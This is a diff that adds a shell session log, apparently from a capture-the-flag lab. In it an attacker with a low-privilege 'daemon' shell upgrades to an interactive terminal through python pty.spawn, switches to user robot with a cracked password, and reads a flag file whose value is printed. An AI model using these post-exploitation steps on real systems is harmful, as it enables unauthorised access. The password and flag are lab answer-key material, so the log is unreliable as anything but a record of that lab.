@@ -1,0 +1,39 @@
+su - robot
+su: must be run from a terminal
+daemon@linux:/home$ abcdefghijklmnopqrstuvwxyz
+abcdefghijklmnopqrstuvwxyz
+bash: abcdefghijklmnopqrstuvwxyz: command not found
+daemon@linux:/home$ term=xterm
+term=xterm
+daemon@linux:/home$ su - robot
+su - robot
+su: must be run from a terminal
+daemon@linux:/home$ sudo su - robot
+sudo su - robot
+sudo: no tty present and no askpass program specified
+daemon@linux:/home$ su - robot
+su - robot
+su: must be run from a terminal
+daemon@linux:/home$ python -c 'import pty;pty.spawn("/bin/bash")'
+python -c 'import pty;pty.spawn("/bin/bash")'
+daemon@linux:/home$ ls
+ls
+robot
+daemon@linux:/home$ pwd
+pwd
+/home
+daemon@linux:/home$ su - robot
+su - robot
+Password: abcdefghijklmnopqrstuvwxyz
+
+$ whoami
+whoami
+robot
+$ cd /home/robot
+cd /home/robot
+$ ls
+ls
+key-2-of-3.txt  password.raw-md5
+$ cat key-2-of-3.txt
+cat key-2-of-3.txt
+822c73956184f694993bede3eb39f959
